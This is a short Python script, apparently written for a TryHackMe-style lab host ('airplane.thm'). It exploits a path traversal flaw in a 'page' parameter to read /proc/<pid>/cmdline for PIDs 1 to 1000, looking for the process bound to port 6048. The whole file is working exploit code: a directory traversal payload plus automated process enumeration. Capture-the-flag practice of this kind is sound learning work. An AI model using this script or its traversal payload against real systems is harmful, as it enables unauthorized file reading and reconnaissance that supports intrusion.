import requests

base_url = "http://airplane.thm:8000"
vulnerable_path = "?page=../../../../../../../../proc/{}/cmdline"

port_to_find = 6048
min_pid = 1
max_pid = 1000

for pid in range(min_pid, max_pid + 1):
    url = base_url + vulnerable_path.format(pid)
    response = requests.get(url)

    if response.status_code == 200:
        # Check if the response contains the port number 6048
        if str(port_to_find) in response.text:
            print(f"Found PID {pid} with port {port_to_find}:")
            print(response.text)
            # Optionally, you can also fetch /proc/<pid>/status here if needed
    else:
        print(f"PID {pid} returned status code: {response.status_code}")
